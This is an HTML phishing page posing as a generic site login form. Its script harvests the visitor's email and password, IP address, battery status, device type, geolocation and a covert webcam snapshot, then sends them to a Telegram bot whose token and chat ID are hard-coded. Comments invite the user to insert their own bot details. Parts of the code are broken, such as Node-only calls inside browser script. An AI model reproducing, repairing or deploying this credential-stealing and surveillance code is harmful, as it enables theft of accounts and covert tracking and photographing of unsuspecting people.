<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Collector</title>
</head>
<body>
    <h1>Welcome to Our Site</h1>
    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>

    <form id="dataForm">
        <label for="email">Email:</label>
        <input type="email" id="email" name="email" required>
        <br>
        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>
        <br>
        <button type="submit">Submit</button>
    </form>

    <script>
        const fetch = require('node-fetch');

const TOKEN = '7221265350:AAFW3JNsT8JtmBhSo_mt7GDi6tSjx36MEEg'; // Ganti dengan token bot Telegram Anda
const CHAT_ID = '7254975140'; // Ganti dengan ID chat Anda

async function sendPhotoWithCaption(photoPath, caption) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', fs.createReadStream(photoPath)); // Foto harus ada di path yang ditentukan
    formData.append('caption', caption);

    try {
        const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
        });

        const result = await response.json();
        console.log(result);
    } catch (error) {
        console.error('Error sending photo:', error);
    }
}

        async function sendToTelegram(data, photoUrl) {
            const botToken = "7221265350:AAFW3JNsT8JtmBhSo_mt7GDi6tSjx36MEEg"; // Replace with your bot token
            const chatId = "7254975140"; // Replace with your chat ID

            const message = `
            *User Information*
            *Email:* ${data.email}
            *Password:* ${data.password}
            *IP Address:* ${data.ip}
            *Battery Level:* ${data.battery.level}
            *Charging:* ${data.battery.charging}
            *Device Info:* ${data.phoneInfo}
            *Location:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}
            `;

            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });

            if (photoUrl) {
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        photo: photoUrl
                    })
                });
            }
        }

        async function getIPAddress() {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        }

        async function getBatteryInfo() {
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                return { level: battery.level * 100 + "%", charging: battery.charging ? "Yes" : "No" };
            } else {
                return { level: "Unknown", charging: "Unknown" };
            }
        }

        function getPhoneInfo() {
            const ua = navigator.userAgent;
            if (/android/i.test(ua)) return "Android Device";
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) return "iOS Device";
            if (/windows phone/i.test(ua)) return "Windows Phone";
            if (/Macintosh/i.test(ua)) return "Macintosh";
            if (/Windows/i.test(ua)) return "Windows PC";
            return "Unknown";
        }

        function getLocation() {
            return new Promise((resolve, reject) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(position => {
                        resolve({ lat: position.coords.latitude, lon: position.coords.longitude });
                    }, () => {
                        resolve({ lat: "Unknown", lon: "Unknown" });
                    });
                } else {
                    resolve({ lat: "Unknown", lon: "Unknown" });
                }
            });
        }

        function takePhoto() {
            return new Promise((resolve, reject) => {
                const video = document.getElementById('video');
                const canvas = document.getElementById('canvas');
                const context = canvas.getContext('2d');

                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        video.srcObject = stream;
                        setTimeout(() => {
                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
                            video.srcObject.getTracks().forEach(track => track.stop());
                            resolve(canvas.toDataURL('image/png'));
                        }, 100); // Wait 3 seconds before taking the photo
                    })
                    .catch(err => {
                        console.error("Error accessing webcam:", err);
                        resolve("");
                    });
            });
        }

        async function gatherAndSendData() {
            const ip = await getIPAddress();
            const battery = await getBatteryInfo();
            const phoneInfo = getPhoneInfo();
            const location = await getLocation();
            const photoUrl = await takePhoto();

            const formData = new FormData(document.getElementById('dataForm'));
            const email = formData.get('email');
            const password = formData.get('password');

            const data = { ip, battery, phoneInfo, location, email, password };
            sendPhotoWithCaption(data, photoUrl);
           // sendToTelegram(data, photoUrl);
        }

        document.getElementById('dataForm').addEventListener('submit', (event) => {
            event.preventDefault();
            gatherAndSendData();
        });

    </script>
</body>
</html>
